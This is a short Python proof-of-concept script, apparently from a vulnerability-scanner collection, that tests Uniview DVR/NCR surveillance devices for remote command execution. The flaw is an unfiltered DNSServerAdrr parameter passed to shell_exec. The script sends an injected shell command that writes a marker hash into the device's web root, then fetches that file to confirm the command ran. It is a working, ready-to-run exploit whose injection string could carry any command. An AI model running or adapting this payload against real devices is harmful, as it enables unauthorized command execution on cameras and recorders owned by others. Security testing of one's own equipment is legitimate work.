#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 浙江宇视（DVR/NCR）监控设备远程命令执行漏洞
referer: http://www.wooyun.org/bugs/WooYun-2016-182299
author: Lucifer
description: DNSServerAdrr参数未过滤直接进入shell_exec执行导致。
'''
import sys
import requests


class camera_uniview_dvr_rce_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = '/Interface/DevManage/VM.php?cmd=setDNSServer&DNSServerAdrr=" |echo "81dc9bdb52d04dc20036dbd8313ed055" >/usr/local/program/ecrwww/apache/htdocs/Interface/DevManage/hit.txt %23"'
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            cmdurl = self.url + "/Interface/DevManage/hit.txt"
            req2 = requests.get(cmdurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                return "[+]存在浙江宇视（DVR/NCR）监控设备远程命令执行漏洞...(高危)\tpayload: "+vulnurl+"\tcmdurl: "+cmdurl
            else:
                return "[-]no vuln"

        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = camera_uniview_dvr_rce_BaseVerify(sys.argv[1])
    testVuln.run()